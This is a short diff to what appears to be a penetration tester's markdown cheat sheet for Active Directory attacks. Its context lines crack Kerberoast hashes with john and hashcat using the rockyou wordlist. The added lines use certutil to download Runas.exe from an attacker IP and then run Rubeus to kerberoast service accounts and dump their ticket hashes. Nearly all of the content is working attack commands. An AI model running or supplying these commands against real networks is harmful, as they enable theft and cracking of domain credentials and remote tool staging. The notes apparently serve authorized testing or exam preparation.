@@ -977,7 +977,10 @@ download ./kerberoast.hashes
 john kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
 hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
 
-# Invoke RunasCs.ps1
+# RunasCs.exe
+certutil -urlcache -split -f http://192.168.45.192/Runas.exe
+.\Rubeus.exe kerberoast /outfile:kerberoast.hashes
+
 
 ```
 
